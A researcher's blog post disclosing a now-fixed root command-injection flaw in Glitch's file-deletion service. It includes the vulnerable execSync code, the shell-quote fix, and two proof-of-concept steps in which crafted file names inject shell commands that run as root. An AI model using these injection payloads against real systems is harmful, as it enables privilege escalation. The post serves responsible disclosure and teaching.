---
date: Wed Nov 10 2021 23:22:39 -0800 (Pacific Standard Time)
qualitative_time: 
title: The privileged daemon that used shell-quote
previous_teaser: How to disown a weapon in GTA Online
previous_first: true
has_highlighting: true
---
In 2020, I discovered a root privilege escalation vulnerability in the way Glitch deletes project files.
This vulnerability is now fixed.

## Brief summary

A program that ran as root would do this:

```js
child_process.execSync(`rm -r '${fullOldPath}'`);
```

## Where was this?

Inside project containers, a service called "OT storage" (OT referring to _operational transformation_, an algorithm Glitch uses to manage concurrent modifications to the project from multiple users) accepts changes from the editor and applies the changes to the project container's filesystem.
The OT storage service runs as root (I don't know why).

One of the operations the OT storage service performs is to delete a given directory and its contents.
The OT storage service is written in Node.js, the standard library of which does not provide a way to delete a directory recursively.
So it's up to the application to implement logic to do that or to use a third-party library.
Maybe using the `rm` program's recursive deletion was the most appealing way to do it.

## A copy of the report I sent to Glitch

In various places in the ot-storage service, it shells out like this:

```js
child_process.execSync(`rm -f '${completePath}'`);
```

With a number of dangerous qualities:

1. It uses the raw `child_process` module, which doesn't switch to the app user.
2. It includes user-controlled data in `completePath`.
3. It constructs the command using string concatenation.
4. It doesn't escape or sanitize the varying part.

A specially crafted filename can trick ot-storage into running other shell commands.
Because ot-storage runs as root, those commands will run as root.

### Sample exploit with dummy payload

In the terminal:

```sh
touch touch a\'\;id\>me\'
touch a
refresh
```

In the editor, delete `a';id>me'`.

Verify in the terminal:

```sh
ls # a gone
ls -l /opt/watcher/me # created, owned by root
```

## Notes

The JavaScript line I quoted in the report wasn't the one that the sample exploit triggered.
The sample exploit triggered the one I put in the brief summary section above.

The line I quoted in the report was used for cleaning up a failed write in some exotic cases.
This one didn't have to be recursive, but maybe they shelled out just for consistency.

## Glitch's fix

They stuck with using `rm -r` for recursive deletion, but they used a package called `shell-quote` to escape the filename.

```js
const shell_quote_1 = require("shell-quote");
...
child_process.execSync(shell_quote_1.quote(['rm', '-r', fullOldPath]));
```

## Further investigation

Around the time Glitch notified me of their fix, I was working on a project that needed to quote some text for shell parameters.
In my project, I opted to write [my own logic](https://github.com/wh0/snail-cli/blob/v2.9.0/src/index.js#L331-L333) to do it:

```js
function shellWord(s) {
  return '\'' + s.replace(/'/g, '\'"\'"\'') + '\'';
}
```

(Don't look at how it's used.
I know there is a critical problem with that.)

I wanted to know how other people did it---perhaps the people who contributed to the 10,559,861 weekly downloads were on to something---so I looked into how the shell-quote package worked.
It was quite different from how I was doing it.
In comparing the behaviors, I found a [vulnerability in shell-quote](/2021/10/28/shell-quote-rce-exploiting.html) that I mentioned in an earlier post, and I reported it to the shell-quote project.

I kept the shell-quote vulnerability private during that time.
I suggested to Glitch that they use `execFileSync` so that they wouldn't have to bother with quoting in the first place, but they declined to take action without a proof of concept exploit.

Soon after, the shell-quote project released a fixed version and publicly disclosed the vulnerability.
Glitch then updated to that fixed version.

Here's how this would have been exploited on Glitch though:

```sh
cat >/app/other.sh <<EOF
#!/bin/sh
id >/tmp/i-am-pwned
echo oh no
EOF
chmod +x /app/other.sh
mkdir '`:`'
mkdir '`:`/app'
touch '`:`/app/other.sh``:`'
refresh
```
Then delete ``` '`:`/app/other.sh``:`' ``` in the editor:

![](/assets/2021/glitch-ot-rm-tree.png)

## Timeline

**2020/11/10**
I find this vulnerability.
I send the report to Glitch.

**2020/11/11**
Glitch forwards the report to the engineering team.

**2021/10/08**
I ask about the status of this report.

**2021/10/14**
Glitch notifies me that they've deployed a fix.
I find the shell-quote vulnerability.
I report that to the shell-quote team for confirmation.
I suggest `execFileSync` to Glitch.

**2021/10/15**
Glitch replies that they won't take action.

**2021/10/21**
The shell-quote correspondence simultaneously confirms the vulnerability, announces it, and publishes a fixed version.
I inform Glitch of the fixed version.

**2021/10/26**
Glitch deploys the fixed version of shell-quote.
We come to an agreement that the vulnerability is fixed.

## Discussion

Special mention to RiversideRocks for raising awareness about shell safety in a [CTF challenge]( https://support.glitch.com/t/can-you-read-the-secret-file/30396) featuring command injection shortly before this.

This is the second time we're seeing the date 2021/10/08 involved.
We'll be seeing it a few more times in the future too.
